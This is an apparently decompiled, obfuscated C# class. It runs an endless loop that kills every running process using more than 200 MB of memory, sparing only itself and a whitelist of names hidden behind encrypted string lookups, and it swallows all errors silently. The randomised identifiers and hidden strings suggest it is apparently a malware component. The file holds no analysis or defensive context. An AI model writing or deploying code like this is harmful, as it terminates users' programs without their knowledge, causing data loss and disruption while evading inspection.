using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wawLLalyhHSFm;

public static class uPNCNmymAv
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void FKLPXWFxnzp()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107398021)) && !process.ProcessName.Contains(getString_0(107398012)) && !process.ProcessName.Contains(getString_0(107397971)) && !process.ProcessName.Contains(getString_0(107397994)) && !process.ProcessName.Contains(getString_0(107397981)) && !process.ProcessName.Contains(getString_0(107397936)) && !process.ProcessName.Contains(getString_0(107397955)) && !process.ProcessName.Contains(getString_0(107397910)) && !process.ProcessName.Contains(getString_0(107397929)) && !process.ProcessName.Contains(getString_0(107397916)) && !process.ProcessName.Contains(getString_0(107397895)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static uPNCNmymAv()
	{
		Strings.CreateGetStringDelegate(typeof(uPNCNmymAv));
	}
}
